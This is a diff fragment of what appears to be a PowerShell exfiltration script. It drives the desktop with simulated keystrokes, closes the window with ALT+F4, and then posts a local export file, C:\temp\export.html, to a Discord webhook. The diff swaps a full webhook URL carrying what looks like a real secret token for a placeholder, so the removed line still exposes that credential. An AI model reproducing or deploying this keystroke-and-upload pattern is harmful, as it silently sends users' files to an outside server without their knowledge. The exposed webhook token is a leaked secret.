@@ -26,7 +26,7 @@ SendKeys.SendWait('h')
 Start-Sleep -Seconds 1.7
 SendKeys.SendWait('%{F4}')  # ALT + F4
 
-$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
+$webhookUrl = 'DISCORD-WEBHOOK'
 $filePath = 'C:\temp\export.html'
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = Get-Item $filePath }
 
